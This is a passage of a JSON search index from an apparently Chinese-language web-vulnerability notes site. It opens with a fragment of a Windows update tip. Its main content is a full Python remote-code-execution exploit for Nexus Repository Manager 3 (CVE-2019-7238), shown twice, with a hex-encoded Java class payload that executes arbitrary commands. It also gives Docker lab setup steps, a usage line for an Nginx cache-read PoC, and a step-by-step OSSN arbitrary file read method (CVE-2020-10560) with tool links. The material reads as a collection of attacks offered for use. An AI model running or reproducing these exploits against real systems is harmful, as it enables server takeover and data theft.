\u53f3\u952e\u70b9\u51fbWindows\u56fe\u6807\uff0c\u9009\u62e9\u201c\u8bbe\u7f6e(N)\u201d\uff0c\u9009\u62e9\u201c\u66f4\u65b0\u548c\u5b89\u5168\u201d-\u201cWindows\u66f4\u65b0\u201d\uff0c\u67e5\u770b\u8be5\u9875\u9762\u4e0a\u7684\u63d0\u793a\u4fe1\u606f\uff0c\u4e5f\u53ef\u70b9\u51fb\u201c\u67e5\u770b\u66f4\u65b0\u5386\u53f2\u8bb0\u5f55\u201d\u67e5\u770b\u5386\u53f2\u66f4\u65b0\u60c5\u51b5\u3002 \u9488\u5bf9\u672a\u6210\u529f\u5b89\u88c5\u7684\u66f4\u65b0\uff0c\u53ef\u70b9\u51fb\u66f4\u65b0\u540d\u79f0\u8df3\u8f6c\u5230\u5fae\u8f6f\u5b98\u65b9\u4e0b\u8f7d\u9875\u9762\uff0c\u5efa\u8bae\u7528\u6237\u70b9\u51fb\u8be5\u9875\u9762\u4e0a\u7684\u94fe\u63a5\uff0c\u8f6c\u5230\u201cMicrosoft\u66f4\u65b0\u76ee\u5f55\u201d\u7f51\u7ad9\u4e0b\u8f7d\u72ec\u7acb\u7a0b\u5e8f\u5305\u5e76\u5b89\u88c5\u3002","title":"\u6ce8\u610f\u4e8b\u9879"},{"location":"Web%E5%AE%89%E5%85%A8/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/","text":"\u5f71\u54cd\u7248\u672c \u00b6 Nexus Repository Manager OSS/Pro 3.6.2 \u7248\u672c\u5230 3.14.0 \u7248\u672c \u642d\u5efa\u73af\u5883 \u00b6 DockerHub docker pull sonatype/nexus3:3.14.0 docker run -d -p 8081:8081 --name nexus sonatype/nexus3:3.14.0 \u8bbf\u95ee\u4e00\u4e0b \u5728\u4e0a\u4f20\u7684\u4f4d\u7f6e\u968f\u4fbf\u4f20\u4e00\u4e2ajar \u7684\u5305\uff0c \u89e6\u53d1\u8be5\u6f0f\u6d1e\uff0c\u5fc5\u987b\u4fdd\u8bc1\u4ed3\u5e93\u91cc\u81f3\u5c11\u6709\u4e00\u4e2a\u5305\u5b58\u5728\u3002 poc\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/jas502n/CVE-2019-7238 @@ -0,0 +1,53 @@ import requests import requests.packages.urllib3 requests.packages.urllib3.disable_warnings() import sys banner = ''' _______ ________ ___ ___ __ ___ ______ ___ ____ ___ / ____\\ \\ / / ____| |__ \\ / _ \\/_ |/ _ \\ |____ |__ \\|___ \\ / _ \\ | | \\ \\ / /| |__ ______ ) | | | || | (_) |______ / / ) | __) | (_) | | | \\ \\/ / | __|______/ /| | | || |\\__, |______/ / / / |__ < > _ < | |____ \\ / | |____ / /_| |_| || | / / / / / /_ ___) | (_) | \\_____| \\/ |______| |____|\\___/ |_| /_/ /_/ |____|____/ \\___/ Nexus RCE < 3.15.0 Python By jas502n python CVE-2019-7238.py http://10.10.20.166:8081 whoami ''' print banner def CVE_2019_7238(url,cmd): if url[-1] == '/': vuln_url = url + \"service/extdirect\" else: vuln_url = url + \"/service/extdirect\" headers = { 'User-Agent': \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0\", 'Accept': \"*/*\", 'Content-Type': \"application/json\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"7244\", 'Connection': \"close\", 'Cache-Control': \"no-cache\" } payload = \"{\\\"action\\\": \\\"coreui_Component\\\", \\\"type\\\": \\\"rpc\\\", \\\"tid\\\": 8, \\\"data\\\": [{\\\"sort\\\": [{\\\"direction\\\": \\\"ASC\\\", \\\"property\\\": \\\"name\\\"}], \\\"start\\\": 0, \\\"filter\\\": [{\\\"property\\\": \\\"repositoryName\\\", \\\"value\\\": \\\"*\\\"}, {\\\"property\\\": \\\"expression\\\", \\\"value\\\": \\\"function(x, y, z, c, integer, defineClass){ c=1.class.forName('java.lang.Character'); integer=1.class; x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055'; y=0; z=''; while (y lt x.length()){ z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0]; y += 2; };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\\\ndefineClass.setAccessible(true);\\\\nx=defineClass.invoke(\\\\n y,\\\\n 'Exploit.Test234',\\\\n z.getBytes('latin1'), 0,\\\\n 3054\\\\n);x.getMethod('test', ''.class).invoke(null, '%s');'done!'}\\\\n\\\"}, {\\\"property\\\": \\\"type\\\", \\\"value\\\": \\\"jexl\\\"}], \\\"limit\\\": 50, \\\"page\\\": 1}], \\\"method\\\": \\\"previewAssets\\\"}\" % cmd r =requests.post(vuln_url, data=payload,headers=headers, verify=False) if r.status_code ==200: print \"\\nurl= %s\\n\" % vuln_url print \"cmd= %s\\n\" % cmd print \">>>> \\n\" + r.text if __name__ == '__main__': # url = \"http://10.10.20.166:8081\" # cmd = \"whoami\" url = sys.argv[1] cmd = sys.argv[2] CVE_2019_7238(url,cmd)","title":"Nexus Repository Manager 3 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2019-7238"},{"location":"Web%E5%AE%89%E5%85%A8/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_1","text":"Nexus Repository Manager OSS/Pro 3.6.2 \u7248\u672c\u5230 3.14.0 \u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_2","text":"DockerHub docker pull sonatype/nexus3:3.14.0 docker run -d -p 8081:8081 --name nexus sonatype/nexus3:3.14.0 \u8bbf\u95ee\u4e00\u4e0b \u5728\u4e0a\u4f20\u7684\u4f4d\u7f6e\u968f\u4fbf\u4f20\u4e00\u4e2ajar \u7684\u5305\uff0c \u89e6\u53d1\u8be5\u6f0f\u6d1e\uff0c\u5fc5\u987b\u4fdd\u8bc1\u4ed3\u5e93\u91cc\u81f3\u5c11\u6709\u4e00\u4e2a\u5305\u5b58\u5728\u3002 poc\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/jas502n/CVE-2019-7238 @@ -0,0 +1,53 @@ import requests import requests.packages.urllib3 requests.packages.urllib3.disable_warnings() import sys banner = ''' _______ ________ ___ ___ __ ___ ______ ___ ____ ___ / ____\\ \\ / / ____| |__ \\ / _ \\/_ |/ _ \\ |____ |__ \\|___ \\ / _ \\ | | \\ \\ / /| |__ ______ ) | | | || | (_) |______ / / ) | __) | (_) | | | \\ \\/ / | __|______/ /| | | || |\\__, |______/ / / / |__ < > _ < | |____ \\ / | |____ / /_| |_| || | / / / / / /_ ___) | (_) | \\_____| \\/ |______| |____|\\___/ |_| /_/ /_/ |____|____/ \\___/ Nexus RCE < 3.15.0 Python By jas502n python CVE-2019-7238.py http://10.10.20.166:8081 whoami ''' print banner def CVE_2019_7238(url,cmd): if url[-1] == '/': vuln_url = url + \"service/extdirect\" else: vuln_url = url + \"/service/extdirect\" headers = { 'User-Agent': \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0\", 'Accept': \"*/*\", 'Content-Type': \"application/json\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"7244\", 'Connection': \"close\", 'Cache-Control': \"no-cache\" } payload = \"{\\\"action\\\": \\\"coreui_Component\\\", \\\"type\\\": \\\"rpc\\\", \\\"tid\\\": 8, \\\"data\\\": [{\\\"sort\\\": [{\\\"direction\\\": \\\"ASC\\\", \\\"property\\\": \\\"name\\\"}], \\\"start\\\": 0, \\\"filter\\\": [{\\\"property\\\": \\\"repositoryName\\\", \\\"value\\\": \\\"*\\\"}, {\\\"property\\\": \\\"expression\\\", \\\"value\\\": \\\"function(x, y, z, c, integer, defineClass){ c=1.class.forName('java.lang.Character'); integer=1.class; x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055'; y=0; z=''; while (y lt x.length()){ z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0]; y += 2; };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\\\ndefineClass.setAccessible(true);\\\\nx=defineClass.invoke(\\\\n y,\\\\n 'Exploit.Test234',\\\\n z.getBytes('latin1'), 0,\\\\n 3054\\\\n);x.getMethod('test', ''.class).invoke(null, '%s');'done!'}\\\\n\\\"}, {\\\"property\\\": \\\"type\\\", \\\"value\\\": \\\"jexl\\\"}], \\\"limit\\\": 50, \\\"page\\\": 1}], \\\"method\\\": \\\"previewAssets\\\"}\" % cmd r =requests.post(vuln_url, data=payload,headers=headers, verify=False) if r.status_code ==200: print \"\\nurl= %s\\n\" % vuln_url print \"cmd= %s\\n\" % cmd print \">>>> \\n\" + r.text if __name__ == '__main__': # url = \"http://10.10.20.166:8081\" # cmd = \"whoami\" url = sys.argv[1] cmd = sys.argv[2] CVE_2019_7238(url,cmd)","title":"\u642d\u5efa\u73af\u5883"},{"location":"Web%E5%AE%89%E5%85%A8/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 Nginx version 0.5.6 - 1.13.2 \u6f0f\u6d1ePOC \u00b6 POC \u4f7f\u7528\u65b9\u6cd5\uff1apython3 poc.py targeturl","title":"Nginx\u8d8a\u754c\u8bfb\u53d6\u7f13\u5b58\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_1","text":"Nginx version 0.5.6 - 1.13.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#poc","text":"POC \u4f7f\u7528\u65b9\u6cd5\uff1apython3 poc.py targeturl","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 Open Source Social Network(OSSN)5.3\u4e4b\u524d\u7248\u672c\u4e2d\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE-2020-10560\uff09\u3002\u6f0f\u6d1e\u56e0OSSN\u751f\u6210\u7684Site_Key\u5f3a\u5ea6\u8fc7\u4f4e\u4ece\u800c\u53ef\u4ee5\u906d\u53d7\u88ab\u66b4\u529b\u7834\u89e3\u800c\u4ea7\u751f\uff0c\u6210\u529f\u7834\u89e3Site_Key\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528Site_Key\u6784\u9020\u51fa\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u94fe\u63a5\uff0c\u901a\u8fc7components\\OssnComments\\ossn_com.php\u6587\u4ef6\u63d0\u4f9b\u7684\u6587\u4ef6\u9884\u89c8\u63a5\u53e3\uff0c\u8bfb\u53d6\u6587\u4ef6\u3002 \u6f0f\u6d1e\u5229\u7528 \u8bc4\u8bba\u5e16\u5b50\u65f6\uff0c\u7528\u6237\u53ef\u4ee5\u4e0a\u4f20\u56fe\u7247\u53ca\u8868\u60c5\uff0c \u5f53\u9009\u62e9\u672c\u5730\u56fe\u7247\u5e76\u4e0a\u4f20\u540e\uff0c\u5c06\u5728\u8bc4\u8bba\u4e2d\u751f\u6210\u4e00\u4e2a\u9884\u89c8 \u6ce8\u610f\uff0c\u8fd9\u65f6\u8fd8\u6ca1\u6709\u70b9\u51fb\u53d1\u5e03\u8bc4\u8bba\uff0c\u4e0a\u56fe\u56fe\u7247\u53ea\u662f\u4e0a\u4f20\u6210\u529f\u540e\u7684\u4e00\u4e2a\u9884\u89c8\u56fe\u7247\u3002\u8be5\u4e34\u65f6\u56fe\u50cf\u6587\u4ef6\u5b58\u50a8\u4e8etmp\u76ee\u5f55\u5e76\u5728\u524d\u7aef\u5448\u73b0\u4e86\u9884\u89c8\u3002 \u6211\u4eec\u6765\u770b\u4e0b\u8fd9\u4e2a\u4e34\u65f6\u56fe\u7247\u6587\u4ef6\u662f\u5982\u4f55\u83b7\u53d6\u5e76\u5728\u9875\u9762\u4e2d\u5c55\u793a\u7684\u3002\u67e5\u770b\u4e00\u4e0b\u56fe\u7247\u94fe\u63a5 \u5728\u4e34\u65f6\u56fe\u7247\u6587\u4ef6\u88ab\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u65f6\uff0c\u4f1a\u88ab\u5b58\u50a8\u4e8eossn_data/tmp/photos\u6587\u4ef6\u5939\u4e2d \u653b\u51fb\u8005\u5728\u8bc4\u8bba\u91cc\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\uff0c\u4e0d\u70b9\u51fb\u53d1\u9001\uff0c\u67e5\u770b\u6b64\u65f6\u56fe\u7247\u4e34\u65f6\u9884\u89c8\u94fe\u63a5\uff0c\u83b7\u53d6\u94fe\u63a5\u4e2dimage\u53c2\u6570\u503c\u3002\u4f8b\u5982\uff1a http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==\u4e2d\u7684UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ== \u5c06\u6570\u5b570-2147483647\u4f9d\u6b21\u5e26\u5165ossn_generate_site_secret\u4e2d\u8ba1\u7b97\u51fa\u5bf9\u5e94\u7684site_key \u4f9d\u6b21\u5c06site_key\u4e0eimage\u503c\u5e26\u5165ossn_string_decrypt\u4e2d\uff0c\u83b7\u53d6\u89e3\u5bc6\u540e\u7684\u660e\u6587 \u5982\u679c\u660e\u6587\u4e2d\u542b\u6709tmp/photos\u5b57\u7b26\u4e32\uff0c\u89e3\u5bc6\u6210\u529f\uff0c\u6b64\u65f6\u7684site_key\u5373\u4e3a\u6b63\u786e\u7684site_key\u503c \u5728\u83b7\u53d6site_key\u503c\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7ossn_string_encrypt\u65b9\u6cd5\uff0c\u5bf9\u60f3\u8981\u8bfb\u53d6\u7684\u6587\u4ef6\u8fdb\u884c\u52a0\u5bc6\uff0c\u901a\u8fc7http://192.167.30.119/comment/staticimage?image=\u63a5\u53e3\u8fdb\u884c\u8bfb\u53d6\u5373\u53ef \u4e0a\u6587\u6240\u6d89\u53ca\u7684\u5de5\u5177\u5982\u4e0b\uff1a site_key\u8ba1\u7b97\u5de5\u5177 https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery \u52a0\u5bc6\u89e3\u5bc6\u5de5\u5177 https://github.com/kevthehermit/CVE-2020-10560","title":"OSSN\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE-2020-10560\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_1","text":"Open Source Social Network(OSSN)5.3\u4e4b\u524d\u7248\u672c\u4e2d\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE-2020-10560\uff09\u3002\u6f0f\u6d1e\u56e0OSSN\u751f\u6210\u7684Site_Key\u5f3a\u5ea6\u8fc7\u4f4e\u4ece\u800c\u53ef\u4ee5\u906d\u53d7\u88ab\u66b4\u529b\u7834\u89e3\u800c\u4ea7\u751f\uff0c\u6210\u529f\u7834\u89e3Site_Key\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528Site_Key\u6784\u9020\u51fa\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u94fe\u63a5\uff0c\u901a\u8fc7components\\OssnComments\\ossn_com.php\u6587\u4ef6\u63d0\u4f9b\u7684\u6587\u4ef6\u9884\u89c8\u63a5\u53e3\uff0c\u8bfb\u53d6\u6587\u4ef6\u3002 \u6f0f\u6d1e\u5229\u7528 \u8bc4\u8bba\u5e16\u5b50\u65f6\uff0c\u7528\u6237\u53ef\u4ee5\u4e0a\u4f20\u56fe\u7247\u53ca\u8868\u60c5\uff0c \u5f53\u9009\u62e9\u672c\u5730\u56fe\u7247\u5e76\u4e0a\u4f20\u540e\uff0c\u5c06\u5728\u8bc4\u8bba\u4e2d\u751f\u6210\u4e00\u4e2a\u9884\u89c8 